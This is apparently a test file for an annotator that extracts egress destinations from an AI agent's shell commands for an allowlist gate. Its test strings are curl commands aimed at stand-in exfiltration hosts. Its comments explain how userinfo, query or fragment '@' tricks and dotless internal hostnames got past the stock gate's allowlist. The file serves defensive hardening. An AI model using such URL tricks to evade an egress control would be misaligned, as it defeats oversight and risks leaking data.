import { describe, expect, it } from "bun:test";
import { annotateEgressDestination } from "../src/annotate-egress.ts";

/** AGT's preliminary policy input, cut down to the two members this function
 * reads. The real document also carries `intervention_point`, `policy_target`,
 * `annotations` and `tool`; none of them is consulted here. */
function preliminary(toolCall: Record<string, unknown>): unknown {
  return { intervention_point: "pre_tool_call", snapshot: { tool_call: toolCall }, annotations: {} };
}

describe("pulling an egress destination out of a shell command", () => {
  // Every assertion in this block expects an ORIGIN -- scheme, host and port --
  // rather than the text the regex matched. That changed when the hand-rolled
  // normalisation this module used to do was replaced by a real URL parse; it
  // is a behaviour change, not a weakening. The gate consults only the host, so
  // the path, query and fragment were never read by any rule this deployment
  // runs.
  it("finds the destination a curl reaches for", () => {
    expect(
      annotateEgressDestination(
        "egress",
        {},
        preliminary({ name: "Bash", args: { command: "curl https://exfil.test/steal" }, raw_command: "curl https://exfil.test/steal" }),
      ),
    ).toEqual({ destination: "https://exfil.test" });
  });

  it("finds it mid-command, not only at the end", () => {
    expect(
      annotateEgressDestination(
        "egress",
        {},
        preliminary({ name: "Bash", args: {}, raw_command: "curl -sS https://exfil.test/steal -o /tmp/x" }),
      ),
    ).toEqual({ destination: "https://exfil.test" });
  });

  it("stops at the shell metacharacter, not at the end of the line", () => {
    expect(
      annotateEgressDestination("egress", {}, preliminary({ name: "Bash", args: {}, raw_command: "curl https://exfil.test/x; ls" })),
    ).toEqual({ destination: "https://exfil.test" });
  });

  // The stock gate reads the substring after the scheme, cuts it at the first
  // "/", cuts THAT at the first ":", and calls the remainder the host. So a
  // userinfo reads as the host, and the colon-bearing form below was ALLOWED
  // against the shipped allowlist -- measured through a live Guardian -- while
  // the credential-free one denied for a host nothing would be reached at. An
  // origin cannot carry a userinfo at all, which is what closes both.
  it("hands over the host a userinfo would have hidden, not the userinfo", () => {
    expect(
      annotateEgressDestination(
        "egress",
        {},
        preliminary({ name: "Bash", args: {}, raw_command: "curl https://docs.anthropic.com@exfil.attacker.test/steal" }),
      ),
    ).toEqual({ destination: "https://exfil.attacker.test" });
  });

  it("hands over the host a userinfo carrying a colon would have hidden", () => {
    expect(
      annotateEgressDestination(
        "egress",
        {},
        preliminary({ name: "Bash", args: {}, raw_command: "curl https://docs.anthropic.com:pw@exfil.attacker.test/steal" }),
      ),
    ).toEqual({ destination: "https://exfil.attacker.test" });
  });

  it("takes the last @ of the authority as the delimiter, since a userinfo may carry one", () => {
    expect(
      annotateEgressDestination(
        "egress",
        {},
        preliminary({ name: "Bash", args: {}, raw_command: "curl https://a@b:c@exfil.attacker.test/steal" }),
      ),
    ).toEqual({ destination: "https://exfil.attacker.test" });
  });

  it("removes a userinfo from a URL with no path at all", () => {
    expect(
      annotateEgressDestination("egress", {}, preliminary({ name: "Bash", args: {}, raw_command: "curl https://u:p@exfil.attacker.test" })),
    ).toEqual({ destination: "https://exfil.attacker.test" });
  });

  // An "@" inside a path is not a userinfo, and answering the text after it
  // would name a host the request never reaches.
  it("does not read an @ inside the path as a userinfo", () => {
    expect(
      annotateEgressDestination(
        "egress",
        {},
        preliminary({ name: "Bash", args: {}, raw_command: "curl https://exfil.attacker.test/mail@docs.anthropic.com" }),
      ),
    ).toEqual({ destination: "https://exfil.attacker.test" });
  });

  // Nor is an "@" inside a query or a fragment: an authority ends at the first
  // of "/", "?" or "#". Both of these were ALLOWED -- measured through a live
  // Guardian -- by an earlier normalisation that bounded the authority at "/"
  // alone and so answered `https://docs.anthropic.com`.
  it("does not read an @ inside the query as a userinfo", () => {
    expect(
      annotateEgressDestination(
        "egress",
        {},
        preliminary({ name: "Bash", args: {}, raw_command: "curl https://evil.test?x=a@docs.anthropic.com" }),
      ),
    ).toEqual({ destination: "https://evil.test" });
  });

  it("does not read an @ inside the fragment as a userinfo", () => {
    expect(
      annotateEgressDestination(
        "egress",
        {},
        preliminary({ name: "Bash", args: {}, raw_command: "curl https://evil.test#a@docs.anthropic.com" }),
      ),
    ).toEqual({ destination: "https://evil.test" });
  });

  it("still removes a userinfo that sits genuinely ahead of the query", () => {
    expect(
      annotateEgressDestination(
        "egress",
        {},
        preliminary({ name: "Bash", args: {}, raw_command: "curl https://docs.anthropic.com:pw@exfil.attacker.test?x=1" }),
      ),
    ).toEqual({ destination: "https://exfil.attacker.test" });
  });

  // THE SHAPE THAT NEEDS NO USERINFO AND NO "@" SEMANTICS AT ALL, and the one
  // that makes the rest of this block matter. The allowlist glob's "*" spans a
  // single dot-delimited segment, so a "host" of `metadata?x=@docs` `anthropic`
  // `com` matches `*.anthropic.com` -- but only while the real host carries no
  // dot. Dotless names are internal ones, which is the class an egress gate is
  // deployed for. Measured: all three were ALLOWED, and curl reaches
  // `metadata`, `internal-api` and `evil` respectively.
  for (const host of ["metadata", "internal-api", "evil"]) {
    it(`answers the dotless host "${host}" rather than the allowlisted name trailing its query`, () => {
      expect(
        annotateEgressDestination(
          "egress",
          {},
          preliminary({ name: "Bash", args: {}, raw_command: `curl https://${host}?x=@docs.anthropic.com` }),
        ),
      ).toEqual({ destination: `https://${host}` });
    });
  }

  it("answers a dotless host whose fragment trails an allowlisted name", () => {
    expect(
      annotateEgressDestination("egress", {}, preliminary({ name: "Bash", args: {}, raw_command: "curl https://internal-api#@docs.anthropic.com" })),
    ).toEqual({ destination: "https://internal-api" });
  });

  // The port is part of an origin and stays on it. The gate splits it off
  // itself before matching, so keeping it changes no verdict -- asserted here
  // so that "the origin carries the port" is a fact this file records rather
  // than one the next reader has to look up.
  it("keeps the port, which is part of an origin", () => {
    expect(
      annotateEgressDestination("egress", {}, preliminary({ name: "Bash", args: {}, raw_command: "curl https://exfil.attacker.test:8443/steal" })),
    ).toEqual({ destination: "https://exfil.attacker.test:8443" });
  });

  // A URL parse lowercases the host. The allowlist glob is case-sensitive, so
  // this is a change in the PERMISSIVE direction and is asserted rather than
  // left to be discovered: the same command denied before the parse replaced
  // the hand-rolled normalisation. It is correct -- DNS is case-insensitive and
  // the request reaches the allowlisted host either way -- and the two rows
  // below are what stop that correctness being read as "case no longer
  // matters".
  it("lowercases the host, because DNS does", () => {
    expect(
      annotateEgressDestination("egress", {}, preliminary({ name: "Bash", args: {}, raw_command: "curl https://DOCS.ANTHROPIC.COM/x" })),
    ).toEqual({ destination: "https://docs.anthropic.com" });
  });

  it("lowercasing does not make an off-allowlist host allowlisted", () => {
    expect(
      annotateEgressDestination("egress", {}, preliminary({ name: "Bash", args: {}, raw_command: "curl https://EVIL.TEST/x" })),
    ).toEqual({ destination: "https://evil.test" });
  });

  it("answers the real host for a suffix that merely starts with an allowlisted name", () => {
    expect(
      annotateEgressDestination("egress", {}, preliminary({ name: "Bash", args: {}, raw_command: "curl https://docs.anthropic.com.evil.test/x" })),
    ).toEqual({ destination: "https://docs.anthropic.com.evil.test" });
  });

  // The stated miss direction, asserted rather than left implicit: the stock
  // gate is `undefined` when no destination resolves, so the call falls
  // through to the other gates. A command this cannot parse is unexamined, not
  // denied.
  it("answers no destination for a command carrying none, rather than failing", () => {
    expect(annotateEgressDestination("egress", {}, preliminary({ name: "Bash", args: {}, raw_command: "echo hi" }))).toEqual({});
  });

  it("answers no destination when the snapshot carries an empty raw command", () => {
    expect(annotateEgressDestination("egress", {}, preliminary({ name: "WebFetch", args: { url: "x" }, raw_command: "" }))).toEqual({});
  });

  it("answers no destination when the snapshot carries no raw command at all", () => {
    expect(annotateEgressDestination("egress", {}, preliminary({ name: "Bash", args: {} }))).toEqual({});
  });

  // A scheme is not enough to make a URL parseable, and the parse must not be
  // allowed to throw: AGT turns any annotator failure into
  // `runtime_error:annotation_failed`, which denies every call in the
  // deployment. So a match the parser rejects is answered the same way a
  // command with no URL in it is.
  it("answers no destination when the matched text has a scheme but no host", () => {
    expect(annotateEgressDestination("egress", {}, preliminary({ name: "Bash", args: {}, raw_command: "curl https://:1" }))).toEqual({});
  });
});

describe("standing down when the snapshot already carries a destination", () => {
  // Two of the stock gate's destination paths resolving to different strings
  // is not a priority order -- it is a complete-rule conflict, measured as
  // deny runtime_error:policy_invocation_failed. So an argument AGT already
  // reads wins, and this function contributes nothing.
  for (const argument of ["url", "endpoint", "host", "domain"]) {
    it(`contributes nothing when the tool sent its own "${argument}"`, () => {
      expect(
        annotateEgressDestination(
          "egress",
          {},
          preliminary({ name: "SomeTool", args: { [argument]: "https://docs.anthropic.com/a" }, raw_command: "curl https://exfil.test/b" }),
        ),
      ).toEqual({});
    });
  }

  it("still reads the raw command when the tool's own destination argument is not a string", () => {
    expect(
      annotateEgressDestination(
        "egress",
        {},
        preliminary({ name: "SomeTool", args: { url: null }, raw_command: "curl https://exfil.test/b" }),
      ),
    ).toEqual({ destination: "https://exfil.test" });
  });
});

describe("total, whatever it is handed", () => {
  // A throw here is not an error report: AGT turns any annotator failure into
  // its own runtime_error:annotation_failed deny, which lands on every call in
  // the deployment and reads like a policy decision.
  it("never throws and never answers null", () => {
    for (const input of [undefined, null, 42, "a string", {}, { snapshot: null }, { snapshot: { tool_call: 7 } }]) {
      expect(() => annotateEgressDestination("egress", {}, input)).not.toThrow();
      expect(annotateEgressDestination("egress", {}, input)).toEqual({});
    }
  });
});
